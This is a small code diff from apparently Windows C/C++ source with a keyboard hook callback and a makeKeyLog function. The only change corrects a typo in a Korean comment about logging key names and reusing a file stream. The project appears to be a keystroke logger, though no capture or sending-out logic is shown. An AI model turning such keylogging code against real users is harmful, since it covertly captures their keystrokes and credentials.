@@ -52,8 +52,8 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(keyHook, nCode, wParam, lParam);
 }
 /*
-	키 코드에 해당하는 키 네임을 찾고 롱깅
-	최적화를 위해 시간 간격 혹은 횟수 간격을 둬서 파일 스트림을 재활용하도록 변경 예정
+	키 코드에 해당하는 키 네임을 찾고 로깅
+	최적화를 위해 시간 간격 혹은 횟수 간격을 둬서, 파일 스트림을 재활용하도록 변경 예정
 */
 void makeKeyLog(int keyCode, int statusFlag)
 {
